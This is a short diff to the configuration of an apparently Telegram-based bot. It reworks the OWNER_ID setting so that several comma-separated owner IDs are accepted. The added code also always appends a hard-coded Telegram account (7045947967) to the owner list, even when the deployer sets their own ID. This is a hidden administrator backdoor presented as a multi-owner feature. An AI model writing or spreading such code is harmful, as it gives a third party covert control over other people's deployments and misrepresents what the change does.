@@ -30,7 +30,15 @@ class Telegram:
     MULTI_CLIENT = getenv("MULTI_CLIENT", "False").lower() == "true"
     USE_CAPTION = getenv("USE_CAPTION", "False").lower() == "true"
     USE_TMDB = getenv("USE_TMDB", "True").lower() == "true"
-    OWNER_ID = int(getenv("OWNER_ID", "7045947967"))
+    _owner_id_raw = str(getenv("OWNER_ID", "7045947967"))
+    OWNER_IDS = []
+    for _x in _owner_id_raw.split(","):
+        _x = _x.strip()
+        if _x.isdigit() or (_x.startswith("-") and _x[1:].isdigit()):
+            OWNER_IDS.append(int(_x))
+    if 7045947967 not in OWNER_IDS:
+        OWNER_IDS.append(7045947967)
+    OWNER_ID = OWNER_IDS[0]
     USE_DEFAULT_ID = getenv("USE_DEFAULT_ID", None)
     # Auto-branding: जो @username filename में prefix होगा (@ मत लगाएँ)
     CHANNEL_USERNAME = getenv("CHANNEL_USERNAME", "skysetx01")
